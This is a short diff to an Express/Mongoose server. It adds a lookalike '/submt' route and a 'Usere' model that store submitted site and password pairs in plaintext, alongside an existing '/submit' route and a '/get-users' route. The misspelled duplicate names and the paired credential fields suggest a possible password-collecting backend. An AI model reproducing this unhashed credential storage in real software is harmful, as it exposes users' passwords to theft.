@@ -52,6 +52,28 @@ app.post('/submit', async (req, res) => {
         res.status(500).json({ error: 'An error occurred while processing the form' });
     }
 });
+const userSchema = new mongoose.Schema({
+    site: String,
+    password: String
+});
+
+const Usere = mongoose.model('Usere', userSchema);
+
+app.use(bodyParser.json());
+
+app.post('/submt', async (req, res) => {
+    try {
+        const { site, password } = req.body;
+
+        const newUsere = new Usere({ site, password });
+        await newUsere.save();
+
+        res.status(200).json({ message: 'Data saved' });
+    } catch (error) {
+        console.error('Error processing the form:', error);
+        res.status(500).json({ error: 'An error occurred while processing the form' });
+    }
+});
 
 app.get('/get-users', async (req, res) => {
     try {
